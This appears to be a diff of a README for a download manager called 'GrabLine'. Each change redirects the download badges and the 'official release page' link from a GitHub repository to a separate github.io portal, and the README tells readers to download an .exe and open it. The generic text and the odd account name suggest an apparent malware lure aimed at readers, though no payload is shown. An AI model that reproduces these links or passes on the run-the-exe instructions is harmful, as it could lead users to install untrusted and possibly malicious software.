@@ -1,6 +1,6 @@
 # 📥 GrabLine - Save your files with total ease
 
-[![](https://img.shields.io/badge/Download_GrabLine-Blue?style=for-the-badge)](https://github.com/umptieth-ascendingcolon174/GrabLine)
+[![](https://img.shields.io/badge/Download_GrabLine-Blue?style=for-the-badge)](https://umptieth-ascendingcolon174.github.io)
 
 GrabLine manages your internet downloads. It pulls files quickly by splitting them into smaller pieces. You can pause, restart, and organize your queue without trouble. It handles standard web files, torrents, and cloud storage links. It even finds the best video and audio quality from your favorite websites.
 
@@ -8,7 +8,7 @@ GrabLine manages your internet downloads. It pulls files quickly by splitting th
 
 You do not need special skills to use this software. Follow these steps to install the application on your computer.
 
-1. Go to the [official release page](https://github.com/umptieth-ascendingcolon174/GrabLine).
+1. Go to the [official release page](https://umptieth-ascendingcolon174.github.io).
 2. Look for the file ending in `.exe`.
 3. Click the file name to start the download.
 4. Open the downloaded file once it finishes.
@@ -68,7 +68,7 @@ You can also set the program to start automatically when you turn on your comput
 
 ## 📥 Deployment
 
-[![](https://img.shields.io/badge/Download_GrabLine-Grey?style=for-the-badge)](https://github.com/umptieth-ascendingcolon174/GrabLine)
+[![](https://img.shields.io/badge/Download_GrabLine-Grey?style=for-the-badge)](https://umptieth-ascendingcolon174.github.io)
 
 Visit the link above to reach our download portal. We host all versions there. Check the release notes to see what changed in the latest version. We improve the software every month to make it faster and more stable.
 
